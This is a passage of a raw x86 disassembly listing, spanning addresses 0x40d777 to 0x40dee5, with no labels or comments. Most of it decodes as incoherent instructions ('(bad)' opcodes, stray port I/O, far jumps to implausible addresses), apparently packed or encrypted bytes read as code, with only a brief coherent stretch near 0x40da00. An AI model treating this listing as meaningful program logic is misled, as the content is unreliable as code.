  40d777:	and    al,BYTE PTR [ebx+0x1d664c4e]
  40d77d:	out    dx,al
  40d77e:	xchg   si,ax
  40d780:	xchg   BYTE PTR [eax-0x3c69f4ae],dl
  40d786:	dec    edi
  40d787:	xor    al,0x6e
  40d789:	ds push edi
  40d78b:	(bad)  
  40d78c:	lock idiv ebx
  40d78f:	popa   
  40d790:	xor    al,0xd5
  40d792:	mov    dl,0xb9
  40d794:	mov    esi,0x1fc6b787
  40d799:	xchg   esi,eax
  40d79a:	mov    ebp,0xa2e4a69f
  40d79f:	xchg   esp,eax
  40d7a0:	pop    ebp
  40d7a1:	pop    DWORD PTR [eax]
  40d7a3:	adc    eax,ecx
  40d7a5:	pop    edx
  40d7a6:	pop    esp
  40d7a7:	cmp    eax,0xf33dd6a5
  40d7ac:	adc    DWORD PTR [ebx-0x29],eax
  40d7af:	in     eax,0xff
  40d7b1:	sahf   
  40d7b2:	test   ch,bh
  40d7b4:	mov    DWORD PTR [ecx],ecx
  40d7b6:	sub    dl,BYTE PTR [eax]
  40d7b8:	arpl   WORD PTR [ebx],di
  40d7ba:	jnp    0x40d7c9
  40d7bc:	xor    BYTE PTR [ebp+0x26],bh
  40d7bf:	and    eax,0x1204f97e
  40d7c4:	idiv   DWORD PTR [edx-0x55]
  40d7c7:	jmp    0x63001bac
  40d7cc:	in     eax,dx
  40d7cd:	or     BYTE PTR [ebp+0x391d5729],al
  40d7d3:	mov    ch,0x44
  40d7d5:	pop    esp
  40d7d6:	test   eax,0x54cae3b5
  40d7db:	sbb    al,0x64
  40d7dd:	(bad)  
  40d7de:	leave  
  40d7df:	scas   al,BYTE PTR es:[edi]
  40d7e0:	cmp    esp,DWORD PTR [edx-0x1c]
  40d7e3:	and    edx,edx
  40d7e5:	lahf   
  40d7e6:	bound  esp,QWORD PTR [eax]
  40d7e8:	jmp    0xe21d42dd
  40d7ed:	sbb    bl,BYTE PTR [esi+esi*4+0x22]
  40d7f1:	xor    DWORD PTR es:[eax+ebp*2-0x2384cde5],0x399a38a0
  40d7fd:	mov    eax,0xd32fcc13
  40d802:	in     al,dx
  40d803:	ret    0xb33b
  40d806:	les    ebp,FWORD PTR [edi+0x2b9f0eb7]
  40d80c:	lods   al,BYTE PTR ds:[esi]
  40d80d:	push   ebx
  40d80e:	inc    eax
  40d80f:	mov    ch,0x36
  40d811:	mov    cl,0x5c
  40d813:	fist   WORD PTR [eax-0xcb65914]
  40d819:	adc    BYTE PTR [eax-0x75305461],ah
  40d81f:	out    dx,al
  40d820:	lods   eax,DWORD PTR ds:[esi]
  40d821:	xchg   esi,eax
  40d822:	lahf   
  40d823:	loopne 0x40d846
  40d825:	xor    al,0x5a
  40d827:	out    0xe0,al
  40d829:	sub    ch,dl
  40d82b:	cmp    esp,edi
  40d82d:	fucomip st,st(7)
  40d82f:	(bad)  
  40d830:	mov    esi,0xfbbd6bfc
  40d835:	cli    
  40d836:	rcr    DWORD PTR [ebx-0x24],0xfc
  40d83a:	xchg   esp,eax
  40d83b:	fbstp  TBYTE PTR [ebx+eiz*4]
  40d83e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d83f:	fld    DWORD PTR [ebx]
  40d841:	gs mov ebp,0x4b1c2ab8
  40d847:	jno    0x40d883
  40d849:	mov    bh,0xb0
  40d84b:	xchg   ebx,eax
  40d84c:	jae    0x40d886
  40d84e:	fadd   QWORD PTR [eax+ecx*2+0x7130e589]
  40d855:	cs sahf 
  40d857:	ins    DWORD PTR es:[edi],dx
  40d858:	sub    ebp,DWORD PTR fs:[ebp+0x627a8964]
  40d85f:	in     eax,0x68
  40d861:	inc    edx
  40d862:	js     0x40d835
  40d864:	adc    BYTE PTR [ecx],bh
  40d866:	xchg   BYTE PTR [ebx-0x60],ah
  40d869:	sbb    DWORD PTR [edx+0x17b3442a],edi
  40d86f:	or     BYTE PTR [esi+ebx*1],bh
  40d872:	rcr    BYTE PTR [edx],0x98
  40d875:	out    dx,eax
  40d876:	imul   ecx,DWORD PTR [edx+ebx*2+0xcc1bd4e],0x1b
  40d87e:	ds int 0x7e
  40d881:	loope  0x40d872
  40d883:	jo     0x40d857
  40d885:	xor    esi,DWORD PTR [edx+0x5a]
  40d888:	push   eax
  40d889:	push   es
  40d88a:	(bad)  
  40d88b:	fcomp  DWORD PTR [edi]
  40d88d:	lahf   
  40d88e:	aad    0xac
  40d890:	dec    ebx
  40d891:	cld    
  40d892:	dec    ebp
  40d893:	popa   
  40d894:	call   0x14e2:0x8f64d754
  40d89b:	push   esi
  40d89c:	repz xor BYTE PTR [ecx+eax*4-0xf],0x7e
  40d8a2:	ret    0x681a
  40d8a5:	enter  0x18d,0x31
  40d8a9:	cli    
  40d8aa:	push   eax
  40d8ab:	mov    ds:0xc869ed31,eax
  40d8b0:	outs   dx,DWORD PTR ds:[esi]
  40d8b1:	cld    
  40d8b2:	das    
  40d8b3:	add    edx,DWORD PTR [eax]
  40d8b5:	ins    BYTE PTR es:[edi],dx
  40d8b6:	popa   
  40d8b7:	inc    ebx
  40d8b8:	pop    ebp
  40d8b9:	xor    al,0xe7
  40d8bb:	adc    al,0x53
  40d8bd:	in     eax,dx
  40d8be:	jl     0x40d907
  40d8c0:	dec    ebp
  40d8c1:	xchg   ecx,eax
  40d8c2:	bound  ebx,QWORD PTR [eax+0x70aba4d4]
  40d8c8:	scas   eax,DWORD PTR es:[edi]
  40d8c9:	ins    DWORD PTR es:[edi],dx
  40d8ca:	jns    0x40d855
  40d8cc:	xchg   ecx,eax
  40d8cd:	inc    ecx
  40d8ce:	mov    dh,0xf7
  40d8d0:	xor    DWORD PTR [ecx+0x1d],ebx
  40d8d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8d4:	adc    eax,0x56dfffc3
  40d8d9:	shl    DWORD PTR [edx],0xc3
  40d8dc:	call   0x8903:0x8a910feb
  40d8e3:	lock xor edx,DWORD PTR cs:[ebx-0x45]
  40d8e8:	jp     0x40d8df
  40d8ea:	loope  0x40d954
  40d8ec:	test   esp,0xfa394b32
  40d8f2:	mov    bh,BYTE PTR [esi+ebp*1-0x795a9f21]
  40d8f9:	test   al,0xfd
  40d8fb:	nop
  40d8fc:	xchg   ebx,eax
  40d8fd:	sar    DWORD PTR [edi],cl
  40d8ff:	ins    DWORD PTR es:[edi],dx
  40d900:	dec    ebp
  40d901:	popa   
  40d902:	pop    ds
  40d903:	out    dx,al
  40d904:	xchg   edx,eax
  40d905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d906:	and    BYTE PTR [eax],bh
  40d908:	add    eax,0xf9d79205
  40d90d:	and    eax,0xc742e333
  40d912:	scas   eax,DWORD PTR es:[edi]
  40d913:	mov    ah,BYTE PTR [esi]
  40d915:	imul   ecx,DWORD PTR [ebp+0x46d454f7],0xffffffeb
  40d91c:	jo     0x40d8f8
  40d91e:	cmp    al,BYTE PTR [ecx]
  40d920:	and    DWORD PTR [eax+0x74fdbd10],0xb
  40d927:	aad    0x46
  40d929:	nop
  40d92a:	bound  ebp,QWORD PTR ds:0xb2418bbe
  40d930:	inc    eax
  40d931:	push   0xffffffa5
  40d933:	mov    ds:0x89defdef,eax
  40d938:	rcr    BYTE PTR [ecx+eax*8+0x49],1
  40d93c:	or     DWORD PTR [edi+esi*8+0x448db111],0x1119dea1
  40d947:	int3   
  40d948:	jmp    0x40d909
  40d94a:	test   BYTE PTR [eax],al
  40d94c:	je     0x40d8e0
  40d94e:	jbe    0x40d9a5
  40d950:	or     DWORD PTR cs:[edx+0x5b039224],ebx
  40d957:	rcl    BYTE PTR [esp+ecx*8],0x5d
  40d95b:	or     dl,BYTE PTR [ebx+0x74]
  40d95e:	rol    BYTE PTR gs:[eax-0x42],1
  40d962:	dec    edx
  40d963:	pushf  
  40d964:	rol    DWORD PTR [eax],cl
  40d966:	sub    ebx,DWORD PTR [edi+ecx*4-0x7a]
  40d96a:	addr16 in al,0xea
  40d96d:	fwait
  40d96e:	in     eax,0x24
  40d970:	inc    eax
  40d971:	fisub  WORD PTR [ebx]
  40d973:	std    
  40d974:	pop    esi
  40d975:	xor    ebx,eax
  40d977:	pop    esp
  40d978:	sahf   
  40d979:	ret    0x1345
  40d97c:	ret    
  40d97d:	add    al,0xab
  40d97f:	jg     0x40d9fc
  40d981:	rcr    BYTE PTR [esi],cl
  40d983:	scas   al,BYTE PTR es:[edi]
  40d984:	lods   al,BYTE PTR ds:[esi]
  40d985:	cmp    al,0xac
  40d987:	pusha  
  40d988:	rcl    DWORD PTR [edx-0x3],1
  40d98b:	stos   BYTE PTR es:[edi],al
  40d98c:	sbb    al,0x1d
  40d98e:	in     al,0x93
  40d990:	std    
  40d991:	dec    ecx
  40d992:	pop    ebp
  40d993:	sbb    dl,dh
  40d995:	stos   BYTE PTR es:[edi],al
  40d996:	(bad)  
  40d997:	lahf   
  40d998:	iret   
  40d999:	jg     0x40d99d
  40d99b:	call   0x79379af3
  40d9a0:	in     eax,0x12
  40d9a2:	sub    BYTE PTR [esp+esi*1-0x26b4b2fd],0x43
  40d9aa:	imul   esi,DWORD PTR [edi+0x3d],0xf2da419e
  40d9b1:	retf   
  40d9b2:	neg    ecx
  40d9b4:	mov    al,0xb1
  40d9b6:	xor    edx,DWORD PTR [ebx]
  40d9b8:	push   eax
  40d9b9:	adc    eax,DWORD PTR [esi+0x63]
  40d9bc:	test   ebx,ebx
  40d9be:	cwde   
  40d9bf:	dec    eax
  40d9c0:	push   edx
  40d9c1:	dec    dh
  40d9c3:	ins    BYTE PTR es:[edi],dx
  40d9c4:	and    dl,BYTE PTR [ebx-0x71d7225f]
  40d9ca:	xor    dl,BYTE PTR [edi-0x3f]
  40d9cd:	inc    eax
  40d9ce:	cs sti 
  40d9d0:	xor    BYTE PTR [ecx],dl
  40d9d2:	cmp    al,0x40
  40d9d4:	ins    BYTE PTR es:[edi],dx
  40d9d5:	fnstsw WORD PTR [esi+0x61]
  40d9d8:	addr16 jns 0x40d9aa
  40d9db:	mov    edx,eax
  40d9dd:	mov    BYTE PTR [esi-0x43],dh
  40d9e0:	into   
  40d9e1:	int    0xb8
  40d9e3:	fwait
  40d9e4:	sar    bh,0x43
  40d9e7:	mov    ds:0x7d7bfc4f,eax
  40d9ec:	pop    ss
  40d9ed:	cmp    dl,BYTE PTR [ebp+0x57]
  40d9f0:	iret   
  40d9f1:	retf   
  40d9f2:	jno    0x40d9de
  40d9f4:	lahf   
  40d9f5:	mov    eax,0xe2a82580
  40d9fa:	mov    DWORD PTR [ebp+0x14],ecx
  40d9fd:	xor    eax,eax
  40d9ff:	or     DWORD PTR [ebp+0x14],eax
  40da02:	mov    eax,DWORD PTR [ebp-0x50]
  40da05:	mov    ecx,DWORD PTR [ebp-0x4c]
  40da08:	shrd   eax,ecx,0x2
  40da0c:	shr    ecx,0x2
  40da0f:	mov    cx,ax
  40da12:	mov    eax,DWORD PTR [ebp-0x50]
  40da15:	mov    edx,0x655c
  40da1a:	xor    cx,dx
  40da1d:	jmp    0x40dfa7
  40da22:	sbb    DWORD PTR [edx+ebx*1+0x623918bf],0x20
  40da2a:	das    
  40da2b:	je     0x3d0b82e3
  40da31:	mov    ah,0xfd
  40da33:	stos   BYTE PTR es:[edi],al
  40da34:	push   ss
  40da35:	push   ss
  40da36:	cmp    eax,0x91161604
  40da3b:	out    dx,al
  40da3c:	xchg   edi,eax
  40da3d:	out    dx,al
  40da3e:	push   cs
  40da3f:	dec    edi
  40da40:	jmp    0xc95fac8d
  40da45:	icebp  
  40da46:	dec    ebx
  40da47:	int3   
  40da48:	inc    edi
  40da49:	push   ebp
  40da4a:	pop    es
  40da4b:	push   ecx
  40da4c:	aaa    
  40da4d:	mov    ebx,0x7f935983
  40da52:	xor    DWORD PTR [ebx-0x51],ebp
  40da55:	and    BYTE PTR [edx],0xf8
  40da58:	dec    edi
  40da59:	mov    BYTE PTR [edx-0x567a10d],dl
  40da5f:	fnstsw ax
  40da61:	imul   ebp,DWORD PTR [ebx+edi*1-0x718a98ac],0x37
  40da69:	dec    esp
  40da6a:	mov    DWORD PTR [edi+0x6d724561],0x132d5243
  40da74:	jmp    0x856a0680
  40da79:	in     eax,0x81
  40da7b:	mov    cl,0xe1
  40da7d:	(bad)  
  40da7e:	fst    DWORD PTR [edi+ecx*8]
  40da81:	ds push esi
  40da83:	mov    ebx,0xa61a9906
  40da88:	push   eax
  40da89:	imul   edx,DWORD PTR [ebx-0x22],0x6a
  40da8d:	add    BYTE PTR [edi],ch
  40da8f:	fstp   st(4)
  40da91:	repz test BYTE PTR ds:0x6c7c88f8,cl
  40da98:	dec    ecx
  40da99:	rcl    DWORD PTR [ebp+0x3e434cd5],1
  40da9f:	push   es
  40daa0:	jp     0x40dadd
  40daa2:	xchg   ecx,eax
  40daa3:	std    
  40daa4:	sub    DWORD PTR [edx],ebp
  40daa6:	in     eax,dx
  40daa7:	aaa    
  40daa8:	js     0x40da7f
  40daaa:	clc    
  40daab:	xor    BYTE PTR [ebx-0x759a8e80],dl
  40dab1:	push   eax
  40dab2:	iret   
  40dab3:	mov    BYTE PTR [ecx-0x5b29f859],ch
  40dab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daba:	(bad)  
  40dabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dabc:	stos   DWORD PTR es:[edi],eax
  40dabd:	mov    esp,0x4da7b83c
  40dac2:	mov    cl,0xdd
  40dac4:	es jo  0x40dae5
  40dac7:	pop    eax
  40dac8:	xor    dl,dh
  40daca:	inc    esp
  40dacb:	(bad)  
  40dacc:	into   
  40dacd:	out    dx,eax
  40dace:	push   cs
  40dacf:	(bad)  
  40dad0:	movzx  esp,dh
  40dad3:	push   ss
  40dad4:	adc    eax,0x29c2445b
  40dad9:	pop    ebp
  40dada:	lahf   
  40dadb:	jp     0x40da8e
  40dadd:	loop   0x40daf9
  40dadf:	pop    esp
  40dae0:	mov    ch,0xb7
  40dae2:	jnp    0x40da82
  40dae4:	mov    cl,dl
  40dae6:	jmp    0x6247b4a5
  40daeb:	mov    cl,0x2f
  40daed:	push   es
  40daee:	rcl    BYTE PTR [ebp+0x6d497c2],0x70
  40daf5:	dec    esi
  40daf6:	mov    cl,0xf1
  40daf8:	(bad)  
  40daf9:	fld    DWORD PTR [edi+0x739db581]
  40daff:	jg     0x40db52
  40db01:	mov    ds:0xb6469d91,eax
  40db06:	in     al,dx
  40db07:	enter  0x6fb6,0xc7
  40db0b:	lahf   
  40db0c:	xor    ch,BYTE PTR [edi]
  40db0e:	add    dl,bh
  40db10:	outs   dx,BYTE PTR ds:[esi]
  40db11:	add    esi,edi
  40db13:	ror    BYTE PTR [ebx-0x3d],cl
  40db16:	push   es
  40db17:	std    
  40db18:	lahf   
  40db19:	push   edx
  40db1a:	dec    edi
  40db1b:	test   al,0xfb
  40db1d:	inc    ecx
  40db1e:	(bad)  
  40db1f:	outs   dx,BYTE PTR ds:[esi]
  40db20:	fs push ss
  40db22:	ficomp DWORD PTR [ebp-0x266b7ec6]
  40db28:	xchg   dl,bl
  40db2a:	cdq    
  40db2b:	scas   al,BYTE PTR es:[edi]
  40db2c:	popa   
  40db2d:	push   ebp
  40db2e:	mov    fs,WORD PTR [ebx+edx*1]
  40db31:	shr    DWORD PTR [esi+0x21a00eaa],cl
  40db37:	sub    ecx,DWORD PTR [ebx+0x6cf32ead]
  40db3d:	cmp    BYTE PTR ds:0x51f9016c,ch
  40db43:	mov    al,0x9c
  40db45:	lea    ebx,[ebx+ebp*4-0x28]
  40db49:	je     0x40db29
  40db4b:	jnp    0x40db73
  40db4d:	cmp    esp,DWORD PTR [edi-0x7e]
  40db50:	shl    DWORD PTR ds:0xf4956ba5,cl
  40db56:	mov    ds:0xeb36fbfe,al
  40db5b:	out    dx,eax
  40db5c:	add    DWORD PTR [eax],eax
  40db5e:	add    BYTE PTR [ecx-0x5e9b7415],dl
  40db64:	sub    edx,ebp
  40db66:	or     al,0xd2
  40db68:	icebp  
  40db69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db6a:	lods   al,BYTE PTR gs:[esi]
  40db6c:	cmp    ebp,edx
  40db6e:	or     ebx,DWORD PTR [edx]
  40db70:	jbe    0x40db2b
  40db72:	daa    
  40db73:	cmp    BYTE PTR ds:0x6142e92a,dl
  40db79:	pop    ss
  40db7a:	push   esp
  40db7b:	mov    WORD PTR ds:0xe95ba2a4,ss
  40db81:	push   cs
  40db82:	test   BYTE PTR [ecx-0xda0432b],ah
  40db88:	jae    0x40db41
  40db8a:	or     eax,0x21458845
  40db8f:	bnd ja 0x40dbe0
  40db92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db94:	mov    dl,0xbd
  40db96:	lods   eax,DWORD PTR ds:[esi]
  40db97:	ret    
  40db98:	cmp    cl,bl
  40db9a:	fcomi  st,st(3)
  40db9c:	mov    ebx,edx
  40db9e:	lea    ecx,[ebx+0x7b8ff148]
  40dba4:	adc    eax,0x82f998
  40dba9:	jb     0x40db5f
  40dbab:	gs cli 
  40dbad:	out    0x97,al
  40dbaf:	lahf   
  40dbb0:	cld    
  40dbb1:	out    0x35,al
  40dbb3:	sbb    esi,ecx
  40dbb5:	inc    edi
  40dbb6:	or     eax,0xf6bbdafe
  40dbbb:	jmp    0x40db7b
  40dbbd:	mov    eax,ds:0x242685d0
  40dbc2:	loop   0x40dbf4
  40dbc4:	jge    0x40dba2
  40dbc6:	inc    esi
  40dbc7:	test   al,0xae
  40dbc9:	imul   edx,ecx,0xd1dba196
  40dbcf:	loope  0x40dc0d
  40dbd1:	push   ecx
  40dbd2:	mov    ebp,DWORD PTR [edx-0x7c]
  40dbd5:	mov    dl,0x1f
  40dbd7:	dec    ebx
  40dbd8:	dec    edx
  40dbd9:	mov    edi,0xbceccc5c
  40dbde:	ins    DWORD PTR es:[edi],dx
  40dbdf:	dec    esi
  40dbe0:	mov    BYTE PTR ds:0x2f0119b8,0x3a
  40dbe7:	ficomp DWORD PTR [esi-0x48ad0948]
  40dbed:	fst    QWORD PTR [edx+0x14d438b9]
  40dbf3:	jae    0x40dbc9
  40dbf5:	and    eax,esp
  40dbf7:	xor    DWORD PTR [edi+ebp*2+0x27],ebx
  40dbfb:	or     al,0xce
  40dbfd:	fld    DWORD PTR [edi]
  40dbff:	rol    BYTE PTR [ebp+edx*4-0x21],1
  40dc03:	xor    DWORD PTR [esi],0xc2f5c56a
  40dc09:	mov    bl,0xcf
  40dc0b:	pusha  
  40dc0c:	popf   
  40dc0d:	or     eax,0xed953a4c
  40dc12:	fnstcw WORD PTR ds:0x82a544f0
  40dc18:	std    
  40dc19:	ins    BYTE PTR es:[edi],dx
  40dc1a:	pop    eax
  40dc1b:	adc    DWORD PTR [ebp+0x74],ecx
  40dc1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc1f:	fisubr DWORD PTR [ecx-0xae2832d]
  40dc25:	lahf   
  40dc26:	stos   BYTE PTR es:[edi],al
  40dc27:	sub    eax,0xa7aec097
  40dc2c:	or     ch,BYTE PTR [edx+edx*4-0x275dc6d8]
  40dc33:	jb     0x40dc87
  40dc35:	push   ebx
  40dc36:	gs mov al,0x4b
  40dc39:	xchg   edi,eax
  40dc3a:	xchg   edi,eax
  40dc3b:	cmp    eax,0xcd05978
  40dc40:	mov    esi,0x1b3c075d
  40dc45:	test   BYTE PTR [ebx+0x1c9e5d1c],ch
  40dc4b:	push   0x72
  40dc4d:	sbb    DWORD PTR [eax-0x2c],ebx
  40dc50:	je     0x40dbdb
  40dc52:	push   ds
  40dc53:	jno    0x40dc1a
  40dc55:	mov    edx,0xcb80d951
  40dc5a:	mov    eax,0xef4f4ad3
  40dc5f:	inc    esi
  40dc60:	jns    0x40dbf8
  40dc62:	inc    eax
  40dc63:	pop    ebx
  40dc64:	mov    DWORD PTR [ecx],ebx
  40dc66:	lods   eax,DWORD PTR ds:[esi]
  40dc67:	hlt    
  40dc68:	scas   al,BYTE PTR es:[edi]
  40dc69:	test   eax,0xa62e3e86
  40dc6e:	add    al,0x61
  40dc70:	or     cl,dh
  40dc72:	frstor [ebx-0x77]
  40dc75:	pop    edi
  40dc76:	adc    ecx,DWORD PTR [eax+0x72]
  40dc79:	dec    edi
  40dc7a:	cwde   
  40dc7b:	sub    bl,BYTE PTR [ebx+0x7fd20047]
  40dc81:	or     BYTE PTR [ecx+0x75],bl
  40dc84:	ret    
  40dc85:	mov    cs,edi
  40dc87:	inc    edx
  40dc88:	ret    0x743f
  40dc8b:	jnp    0x40dc84
  40dc8d:	cmp    BYTE PTR [edx+0x7d],dh
  40dc90:	dec    eax
  40dc91:	push   0xfffffff2
  40dc93:	mov    bh,0x86
  40dc95:	dec    BYTE PTR [edx+0x24]
  40dc98:	jmp    0x5de7:0x81616c83
  40dc9f:	and    al,0x93
  40dca1:	repz inc edi
  40dca3:	int3   
  40dca4:	add    al,ch
  40dca6:	(bad)  [esi+ecx*1]
  40dca9:	pop    esp
  40dcaa:	(bad)  
  40dcab:	jge    0x40dc5c
  40dcad:	mov    al,0x5f
  40dcaf:	(bad)  [eax-0x3c929fd6]
  40dcb5:	clc    
  40dcb6:	mov    eax,0xceb82290
  40dcbb:	ret    0x3fa2
  40dcbe:	enter  0x69a2,0xf0
  40dcc2:	xor    cl,dl
  40dcc4:	int    0x47
  40dcc6:	xchg   ebx,eax
  40dcc7:	clc    
  40dcc8:	sbb    ebp,DWORD PTR [esi]
  40dcca:	dec    edi
  40dccb:	push   esp
  40dccc:	lahf   
  40dccd:	push   0xbd946361
  40dcd2:	pop    ss
  40dcd3:	sbb    cl,BYTE PTR [esi+esi*2]
  40dcd6:	pop    ss
  40dcd7:	xchg   esp,eax
  40dcd8:	retf   
  40dcd9:	push   es
  40dcda:	inc    esi
  40dcdb:	repnz outs dx,BYTE PTR ds:[esi]
  40dcdd:	scas   al,BYTE PTR es:[edi]
  40dcde:	in     eax,0xbb
  40dce0:	fisttp QWORD PTR [edx+0x5d66acb4]
  40dce6:	cmp    BYTE PTR [esi],al
  40dce8:	out    0x3c,al
  40dcea:	out    dx,al
  40dceb:	sbb    al,0x39
  40dced:	or     dl,ch
  40dcef:	(bad)  
  40dcf0:	rcr    BYTE PTR [edi],0xb1
  40dcf3:	inc    ebx
  40dcf4:	les    ecx,FWORD PTR [edi]
  40dcf6:	in     eax,0x79
  40dcf8:	rcr    esi,1
  40dcfa:	cld    
  40dcfb:	add    esp,DWORD PTR ds:0xc044f8d5
  40dd01:	mov    ecx,0x1b75ba6f
  40dd06:	aad    0x8
  40dd08:	pop    edi
  40dd09:	icebp  
  40dd0a:	xchg   ebp,eax
  40dd0b:	fadd   QWORD PTR [edx+0x2922d37b]
  40dd11:	lods   eax,DWORD PTR ds:[esi]
  40dd12:	mov    edx,0x94883710
  40dd17:	test   eax,0x5e8aaad3
  40dd1c:	xlat   BYTE PTR ds:[ebx]
  40dd1d:	mov    edi,0x9beb8e33
  40dd22:	sbb    DWORD PTR [edx],0x5d47b1d2
  40dd28:	inc    edx
  40dd29:	jge    0x40dd33
  40dd2b:	xchg   esp,eax
  40dd2c:	jge    0x40dceb
  40dd2e:	rcl    WORD PTR [edx+ebp*2+0x3f],1
  40dd33:	dec    ebx
  40dd34:	cs mov eax,0x8eae954a
  40dd3a:	call   0x524c41b8
  40dd3f:	xor    ah,dl
  40dd41:	cwde   
  40dd42:	call   0x9f46:0x612facb0
  40dd49:	out    dx,eax
  40dd4a:	sub    BYTE PTR [ecx-0x1194b28c],dh
  40dd50:	in     eax,dx
  40dd51:	pop    ebx
  40dd52:	mov    esi,0x99ba84df
  40dd57:	cmp    eax,DWORD PTR [edx-0x49]
  40dd5a:	sub    DWORD PTR [esi+0x6d],ebp
  40dd5d:	xor    edi,DWORD PTR [esi]
  40dd5f:	push   edi
  40dd60:	cdq    
  40dd61:	push   ebp
  40dd62:	dec    ebp
  40dd63:	out    0x8a,al
  40dd65:	push   eax
  40dd66:	pop    es
  40dd67:	dec    ebp
  40dd68:	je     0x40dd7e
  40dd6a:	ror    BYTE PTR [eax],cl
  40dd6c:	fbld   TBYTE PTR [eax-0x54]
  40dd6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd70:	mov    fs:0xbfa7757f,eax
  40dd76:	dec    edx
  40dd77:	mov    esp,0xe9d31ffe
  40dd7c:	clc    
  40dd7d:	push   ss
  40dd7e:	jne    0x40dd89
  40dd80:	push   esi
  40dd81:	xor    ah,bl
  40dd83:	daa    
  40dd84:	inc    eax
  40dd85:	mov    edx,0x86836d7
  40dd8a:	xor    DWORD PTR [ebx+0x55],ebx
  40dd8d:	mov    ss,WORD PTR [edx-0x78aaf651]
  40dd93:	ins    DWORD PTR es:[edi],dx
  40dd94:	inc    eax
  40dd95:	inc    dh
  40dd97:	js     0x40dd40
  40dd99:	jne    0x40ddc8
  40dd9b:	fwait
  40dd9c:	dec    ebp
  40dd9d:	or     DWORD PTR [ecx-0x59],esi
  40dda0:	clc    
  40dda1:	mov    ch,0x61
  40dda3:	or     ebx,eax
  40dda5:	xor    bx,sp
  40dda8:	dec    esp
  40dda9:	and    al,0x50
  40ddab:	mov    edx,0x9ae2ad15
  40ddb0:	or     al,0x26
  40ddb2:	lds    esp,FWORD PTR [edx+0x7a]
  40ddb5:	test   esp,eax
  40ddb7:	call   0xa72ff217
  40ddbc:	dec    eax
  40ddbd:	iret   
  40ddbe:	pop    edx
  40ddbf:	sbb    eax,0x23ae088f
  40ddc4:	shl    DWORD PTR [ebp+ebp*8-0x6a],0x19
  40ddc9:	(bad)  
  40ddca:	jecxz  0x40ddc2
  40ddcc:	js     0x40de3a
  40ddce:	inc    esi
  40ddcf:	jle    0x40de36
  40ddd1:	xor    ah,al
  40ddd3:	dec    esi
  40ddd4:	repz inc edi
  40ddd6:	fdivr  st,st(1)
  40ddd8:	imul   eax,DWORD PTR [ecx-0x6e81b79c],0x23
  40dddf:	xlat   BYTE PTR ds:[ebx]
  40dde0:	and    DWORD PTR [esp-0x59],edx
  40dde4:	fldcw  WORD PTR [edx]
  40dde6:	out    0x35,al
  40dde8:	xchg   esi,eax
  40dde9:	cdq    
  40ddea:	bnd jg 0x40de62
  40dded:	push   ss
  40ddee:	mov    edi,0x4bd3b55b
  40ddf3:	out    dx,al
  40ddf4:	sub    ch,BYTE PTR ds:0x6351fa4d
  40ddfa:	xchg   ebp,eax
  40ddfb:	icebp  
  40ddfc:	lds    edi,FWORD PTR [esi+ebx*8-0x5962e2b9]
  40de03:	loop   0x40de68
  40de05:	test   BYTE PTR [edx-0x6ccedf80],ah
  40de0b:	test   DWORD PTR [eax],edi
  40de0d:	push   si
  40de0f:	jb     0x40dd92
  40de11:	neg    DWORD PTR [edx-0x7f]
  40de14:	jecxz  0x40ddc6
  40de16:	popa   
  40de17:	sub    al,0xb5
  40de19:	pop    eax
  40de1a:	xchg   BYTE PTR [edi],bh
  40de1c:	ret    0xdace
  40de1f:	fbstp  TBYTE PTR [eax]
  40de21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de22:	jbe    0x40ddf2
  40de24:	outs   dx,BYTE PTR ds:[esi]
  40de25:	nop
  40de26:	adc    DWORD PTR [ebx+0x39c3c202],0x7bca0328
  40de30:	add    al,0x37
  40de32:	xor    edi,edx
  40de34:	add    eax,0xffe7db1c
  40de39:	jle    0x40de97
  40de3b:	sub    al,0xc4
  40de3d:	mov    ds:0xa85c1211,al
  40de42:	pop    ds
  40de43:	mov    ch,0x65
  40de45:	xlat   BYTE PTR ss:[ebx]
  40de47:	jecxz  0x40de34
  40de49:	call   0xbfe062ea
  40de4e:	jo     0x40ddf6
  40de50:	push   0xc2f660cd
  40de55:	inc    BYTE PTR [ebx]
  40de57:	std    
  40de58:	retf   
  40de59:	test   BYTE PTR [eax+0x63ea9087],ch
  40de5f:	adc    BYTE PTR [ebx],ah
  40de61:	jmp    0xfe75:0xf1bb83c7
  40de68:	in     al,0x4f
  40de6a:	sti    
  40de6b:	mov    al,0x24
  40de6d:	mov    eax,0x6ee7c0ad
  40de72:	sbb    ch,BYTE PTR [ecx]
  40de74:	mov    bh,0xb
  40de76:	push   edi
  40de77:	call   DWORD PTR [edx+0x7b]
  40de7a:	ds mov ecx,0xe41d87e5
  40de80:	adc    al,0xe9
  40de82:	sar    BYTE PTR [ebx],1
  40de84:	or     edx,esi
  40de86:	jmp    0x40df04
  40de88:	sub    BYTE PTR [edx-0x448dc99d],cl
  40de8e:	xor    esi,DWORD PTR [ebx]
  40de90:	mov    dh,0x51
  40de92:	in     eax,0x6f
  40de94:	mov    ebp,?
  40de96:	jmp    0xc6d8:0x20a8b504
  40de9d:	sub    esp,DWORD PTR [edi+0x40fc7a23]
  40dea3:	ins    BYTE PTR es:[edi],dx
  40dea4:	loope  0x40de9a
  40dea6:	mov    eax,0x9c6bff9d
  40deab:	std    
  40deac:	fmul   DWORD PTR [eax]
  40deae:	xor    eax,0xc4a6bed4
  40deb3:	jae    0x40dec5
  40deb5:	mov    ds:0xfa3fdcab,eax
  40deba:	jnp    0x40df22
  40debc:	push   esi
  40debd:	dec    esp
  40debe:	jmp    0xc85ba8a8
  40dec3:	cld    
  40dec4:	in     eax,0x79
  40dec6:	sar    DWORD PTR [esi+0x21556299],1
  40decc:	cmp    cl,bh
  40dece:	jg     0x40df11
  40ded0:	imul   ebx,DWORD PTR [ecx+eiz*2],0x12f8b7a9
  40ded7:	add    al,0xec
  40ded9:	out    dx,eax
  40deda:	out    0x58,eax
  40dedc:	adc    BYTE PTR [edi],0x4f
  40dedf:	aas    
  40dee0:	inc    ecx
  40dee1:	sub    edx,edx
  40dee3:	push   0xffffffa1
  40dee5:	out    0x2c,al
